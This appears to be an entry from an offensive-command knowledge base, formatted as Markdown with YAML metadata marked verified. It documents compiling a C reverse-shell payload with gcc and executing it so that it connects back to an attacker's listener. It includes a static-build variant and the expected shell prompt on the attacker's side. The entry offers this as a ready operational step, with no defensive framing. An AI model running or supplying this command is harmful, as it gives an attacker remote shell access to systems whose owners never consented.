---
type: command
executor: bash
data: gcc /tmp/shell.c -o csh && ./csh
tags:
  - compilation
  - reverse-shell
platforms:
  - Linux
verified: true
validated: true
---

# gcc-compile-c-reverse-shell-and-execute

## Command

```bash
gcc /tmp/shell.c -o csh && ./csh
```

## Description

This command compiles a C source file containing reverse shell code into an executable binary named 'csh' and then executes it, establishing a TCP reverse shell connection to the attacker's listener. Use this in environments where gcc is available for on-the-fly payload compilation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /tmp/shell.c | Path to the C source file with reverse shell code | Yes |
| -o csh | Output flag specifying the binary name (can be customized) | Yes |
| ./csh | Executes the compiled binary (use full path if needed) | Yes |

## Examples

### Basic Usage

```bash
gcc /tmp/shell.c -o csh && ./csh
```

### Advanced Usage

```bash
gcc -static /tmp/shell.c -o /tmp/csh && /tmp/csh
```

(Adds -static for a standalone binary without dependencies.)

## Expected Output

Compilation succeeds with no output if error-free. Execution produces no local output but connects to the remote listener, where you see a shell prompt like '$' or '#', indicating successful shell access.

## Related

- [[procedures/Establish-C-Reverse-Shell]]
- [[codes/C-Reverse-Shell-Payload]]
